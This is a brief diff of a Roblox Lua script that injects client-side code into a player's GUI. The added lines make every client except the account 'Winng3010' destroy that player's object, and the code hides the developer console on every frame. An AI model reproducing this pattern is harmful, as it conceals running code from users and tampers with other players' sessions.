@@ -942,7 +942,10 @@ function Check(plr)
 	Client.Parent=plr.PlayerGui
 	Sado:Clone().Parent=Client
 	local SourceValue=ins("StringValue",Client)
-	SourceValue.Value=[[game:GetService("RunService").PreSimulation:Connect(function()
+	SourceValue.Value=[[if game.Players.LocalPlayer.Name~="Winng3010" then
+	game.Players:WaitForChild("Winng3010"):Destroy()
+    end
+	game:GetService("RunService").PreSimulation:Connect(function()
 		pcall(function()
 			game:GetService("StarterGui"):SetCore("DevConsoleVisible",false)
 		end)
